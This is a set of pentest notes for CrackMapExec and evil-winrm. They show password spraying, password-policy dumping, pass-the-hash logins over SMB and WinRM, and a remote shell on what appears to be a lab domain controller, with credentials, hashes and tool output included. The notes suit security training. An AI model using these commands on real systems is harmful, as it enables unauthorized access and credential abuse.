- [Installation](#installation)

## [Installation](#installation-1)
```sh
python3 -m pip install pipx
git clone https://github.com/mpgn/CrackMapExec
cd CrackMapExec
pipx install .
```

### TL;DR
```sh
cme smb $ip -u users.txt -p sT333ve2
cme smb $ip -u users.txt -p sT333ve2 --continue-on-success
```

### [Dump password policy with "--pass-pol"](#dump-password-policy-with---pass-pol-1)
cme smb $ip -u support -p '#00^BlackKnight' --pass-pol

### [Pass-the-Hash (PtH) with "-H"](#pass-the-hash-pth-with--h--successful)
cme smb $ip -u Administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62

### [Pass the hash (PtH)](https://attack.mitre.org/techniques/T1550/002/)
> Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password.

### [WINRM Pwn3d!](#winrm-pwn3d-2)
cme smb $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

### [WINRM Pwn3d!](#winrm-pwn3d-2)
cme winrm $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

### [PtH with evil-winrm](#pth-with-evil-winrm-1)
evil-winrm -i $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d


```
--continue-on-success
                        continues authentication attempts even after successes
```


## CrackMapexec v5.4.0 (2023.1-3) doesn't work well. Update latest version manually
```sh
$ cat /etc/os-release 
PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
VERSION_ID="2023.3"
VERSION="2023.3"
...
```

### Installation

https://github.com/mpgn/CrackMapExec

https://wiki.porchetta.industries/getting-started/installation

https://wiki.porchetta.industries/getting-started/installation/installation-on-unix

```

```

### 
```

```

### Examples
### Dump password policy with "--pass-pol"
```sh
$ cme smb $ip -u support -p '#00^BlackKnight' --pass-pol
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [+] Dumping password info for domain: BLACKFIELD
SMB         10.10.10.192    445    DC01             Minimum password length: 7                                                                                         
SMB         10.10.10.192    445    DC01             Password history length: 24                                                                                        
SMB         10.10.10.192    445    DC01             Maximum password age: 41 days 23 hours 53 minutes                                                                  
SMB         10.10.10.192    445    DC01                                                                                                                                
SMB         10.10.10.192    445    DC01             Password Complexity Flags: 000001                                                                                  
SMB         10.10.10.192    445    DC01                 Domain Refuse Password Change: 0                                                                               
SMB         10.10.10.192    445    DC01                 Domain Password Store Cleartext: 0
SMB         10.10.10.192    445    DC01                 Domain Password Lockout Admins: 0
SMB         10.10.10.192    445    DC01                 Domain Password No Clear Change: 0
SMB         10.10.10.192    445    DC01                 Domain Password No Anon Change: 0
SMB         10.10.10.192    445    DC01                 Domain Password Complex: 1
SMB         10.10.10.192    445    DC01             
SMB         10.10.10.192    445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.10.10.192    445    DC01             Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.192    445    DC01             Locked Account Duration: 30 minutes 
SMB         10.10.10.192    445    DC01             Account Lockout Threshold: None
SMB         10.10.10.192    445    DC01             Forced Log off Time: Not Set
```

### Pass-the-Hash (PtH) with "-H" ; STATUS_LOGON_FAILURE
```sh
$ cme smb $ip -u Administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE
```

### Pass-the-Hash (PtH) with "-H" ; Successful
```sh
$ cme smb $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

### WINRM Pwn3d!
```sh
$ cme winrm $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

### [PtH with evil-winrm](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)
```sh
$ evil-winrm -i $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

### 
```

```

https://pypi.org/project/crackmapexec/

# CrackMapexec | SMB & AD Enumeration Simplified !]
https://systemweakness.com/crackmapexec-smb-ad-enumeration-simplified-21e603927f44

https://wiki.porchetta.industries/

https://ptestmethod.readthedocs.io/en/latest/cme.html

https://github.com/Porchetta-Industries/CrackMapExec/wiki/SMB-Command-Reference